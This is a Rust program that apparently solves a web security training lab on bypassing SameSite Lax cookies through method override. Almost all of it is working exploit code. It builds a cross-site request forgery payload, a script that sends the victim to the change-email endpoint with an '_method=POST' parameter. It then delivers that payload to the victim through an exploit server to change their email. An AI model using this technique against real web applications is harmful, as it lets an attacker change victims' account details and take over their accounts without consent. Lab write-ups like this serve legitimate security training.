/***************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 24/10/2023
*
* Lab: SameSite Lax bypass via method override
*
* Steps: 1. Make the request to change the email using the GET method and include an 
*           additional URL parameter to override the method
*        2. Deliver the exploit to the victim
*        3. The victim's email will be changed after they trigger the exploit
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let lab_url = "https://0afd008e034f453a86acbc99007100e3.web-security-academy.net";

    // change this to your exploit server URL
    let exploit_server_url = "https://exploit-0a5b00cf032445ea8650bb6501e500e7.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // the header of your exploit sever response
    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";

    // the new email
    // you can change this to what you want
    let new_email = "hacked@you.com";

    // payload to change the victim's email
    let payload = format!(
        r###"<script>
                location = "{lab_url}/my-account/change-email?email={new_email}&_method=POST"
            </script>
      "###
    );

    print!("{}", "❯❯ Delivering the exploit to the victim.. ".white(),);
    io::stdout().flush();

    // deliver the exploit to the victim
    client
        .post(exploit_server_url)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", exploit_server_head),
            ("responseBody", &payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to deliver the exploit to the victim".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "🗹 The victim's email will be changed after they trigger the exploit".white()
    );
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
